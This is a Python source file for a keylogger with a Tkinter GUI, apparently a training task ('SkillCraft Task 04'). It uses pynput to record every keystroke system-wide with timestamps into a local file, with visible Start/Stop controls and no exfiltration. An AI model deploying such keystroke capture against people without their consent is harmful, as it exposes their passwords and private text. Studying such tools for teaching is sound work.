import tkinter as tk
from pynput import keyboard
import threading
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger - SkillCraft Task 04")
        self.root.geometry("400x250")
        self.root.configure(bg='#1e1e1e')

        self.logging = False
        self.listener = None

        self.status_label = tk.Label(root, text="Status: Idle", fg="white", bg='#1e1e1e', font=("Arial", 12))
        self.status_label.pack(pady=20)

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging, bg="#4caf50", fg="white", width=20, height=2)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, state="disabled", bg="#f44336", fg="white", width=20, height=2)
        self.stop_button.pack(pady=10)

    def start_logging(self):
        self.logging = True
        self.status_label.config(text="Status: Logging...")
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

        threading.Thread(target=self.run_keylogger, daemon=True).start()

    def stop_logging(self):
        self.logging = False
        if self.listener:
            self.listener.stop()
        self.status_label.config(text="Status: Stopped")
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")

    def on_press(self, key):
        if not self.logging:
            return False
        try:
            with open("key_log.txt", "a") as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n")
        except AttributeError:
            with open("key_log.txt", "a") as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n")

    def run_keylogger(self):
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()